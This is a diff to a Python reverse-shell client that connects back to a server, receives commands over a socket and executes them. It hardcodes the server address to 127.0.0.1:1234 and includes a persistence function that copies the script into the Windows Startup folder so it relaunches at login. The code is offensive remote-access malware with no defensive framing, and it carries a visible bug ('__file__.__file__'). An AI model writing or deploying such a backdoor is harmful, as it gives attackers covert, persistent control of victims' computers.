@@ -5,10 +5,9 @@ import sys
 import shutil
 
 
-
 def main():
-    server_host = sys.argv[1]
-    server_port = sys.argv[2]
+    server_host = "127.0.0.1"  # sys.argv[1]
+    server_port = 1234  # sys.argv[2]
     buffer_size = 1024 * 256  # 256 KB per message
 
     seperator = "<br>"
@@ -26,6 +25,7 @@ def main():
         # receive the command from the server
         command = s.recv(buffer_size).decode()
         split_command = command.split()
+        output = ""
         if command.lower() == "exit":  # if the command is exit, break loop
             break
         elif split_command[0].lower() == "cd":  # cd command, change directory
@@ -56,7 +56,8 @@ def send_msg(client_socket, msg):
 
 def persistence():
     old_location = __file__.__file__
-    new_location = "C:\\Users\\"+os.getlogin()+"\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Programs\\Startup\\client.py"
+    new_location = "C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Programs" \
+                                                   "\\Startup\\client.py"
     shutil.copyfile(old_location, new_location)
 
 
